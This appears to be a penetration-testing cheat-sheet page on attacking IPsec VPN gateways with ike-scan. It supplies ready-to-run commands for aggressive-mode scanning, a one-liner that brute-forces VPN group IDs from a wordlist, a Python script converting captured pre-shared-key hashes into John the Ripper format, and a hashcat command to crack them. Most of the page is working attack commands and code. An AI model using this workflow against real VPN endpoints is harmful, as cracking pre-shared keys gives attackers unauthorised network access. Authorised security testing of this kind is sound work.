# ike-scan

### Quick and Dirty - Evidence Gathering:

`for ike in $(cat ike-hosts.txt); do echo "[*] Testing $ike"; ike-scan -M -A -n cisco --trans=5,2,1,2 $ike -P; done`

### Obtaining the hash

There are several condition sets which can be used to determine if the group ID is correct for the hash received.

1. On older devices, the hash was only sent with the correct group ID. If you get a hash, but other responses do send the hash, the group ID which solicits hashes is correct.
2. If a response contains a Dead Peer Detection (DPD) flag, but other group IDs do not have DPD, group IDs which solicit DPD responses are correct.
3. Should all group IDs respond with a DPD, the device is patched and there is no way to determine what the group ID should be from outside the device or client.

These cases are only valid for default configurations. If an administrator of the device decided to turn off DPD, you could have a false negative to determine group ID.

`ike-scan -M -A 1.1.1.1 --id=idguess -P`

You can use the following one-liner to brute force for the ID:

`while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/seclists/Miscellaneous/ike-groupid.txt`

Use the following [`ikescan2john.py`](http://ikescan2john.py/) script to output it in a format we can crack:

{% code overflow="wrap" %}
```python
#!/usr/bin/env python
# taken from: <https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/ikescan2john.py>
"""ikescan2john.py processes ike-scan output files into a format suitable
for use with JtR."""

import sys

def usage():
    sys.stderr.write("Usage: %s <psk-parameters-file> [norteluser]\\n" % \\
                     sys.argv[0])
    sys.exit(-1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()

    with open(sys.argv[1], "r") as f:
        for line in f.readlines():
            line = line.rstrip().replace(':', '*')
            if len(sys.argv) == 2:
                sys.stdout.write("$ike$*0*%s\\n" % (line))
            elif len(sys.argv) == 3:
                sys.stdout.write("$ike$*1*%s*%s\\n" % (sys.argv[2], line))
            else:
                usage()
```
{% endcode %}

You should be able to crack it with this:

`hashcat -m 5400 ike.hash -a 3 ?a?a?a?a?a?a?a -i -w4 -0`
